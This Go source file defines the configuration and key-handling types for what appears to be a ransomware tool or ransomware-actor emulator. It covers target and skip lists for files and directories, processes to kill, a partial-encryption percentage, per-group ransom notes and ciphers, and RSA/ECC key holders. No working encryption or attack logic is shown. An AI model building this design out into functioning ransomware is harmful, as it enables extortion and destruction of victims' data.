package main

import (
	"crypto/rsa"
	"github.com/Anonghost720/ecc"
)

type Config struct {
	Groups                  []RansomActor `yaml:"groups"`
	DirectoryExclusions     []string      `yaml:"directory_skips"`
	FileExtensionExclusions []string      `yaml:"file_extension_skips"`
	FileNameExclusions      []string      `yaml:"file_name_skips"`
	ProcessKillNames        []string      `yaml:"process_kill_names"`
	FileExtensionInclusions []string      `yaml:"file_extension_targets"`
	MaxSizeFullEncryption   int64         `yaml:"full_encryption_max_bytes"`
	EncryptionPercent       int           `yaml:"encryption_percentage"`
}

type RansomActor struct {
	Group           string   `yaml:"group"`
	ExtensionMethod string   `yaml:"extension_method"`
	Extensions      []string `yaml:"extensions"`
	Notes           []string `yaml:"notes"`
	Note            string   `yaml:"note"`
	Cipher          string   `yaml:"cipher"`
	AsymCipher      string   `yaml:"asym"`
}

type LogLevel string

const (
	INFO  LogLevel = "INFO"
	ERROR LogLevel = "ERROR"
)

type File struct {
	Path string // full path
	Size int64  // bytes
}

type AsymKeyHandler struct {
	RSAPublicKey      *rsa.PublicKey
	RSAPublicKeyFile  string
	RSAPrivateKey     *rsa.PrivateKey
	RSAPrivateKeyFile string
	ECCPublicKey      *ecc.Public
	ECCPublicKeyFile  string
	ECCPrivateKey     *ecc.Private
	ECCPrivateKeyFile string
	System            string
}

type AsymmetricEncrypt interface {
	Encrypt(param1 []byte) []byte
}
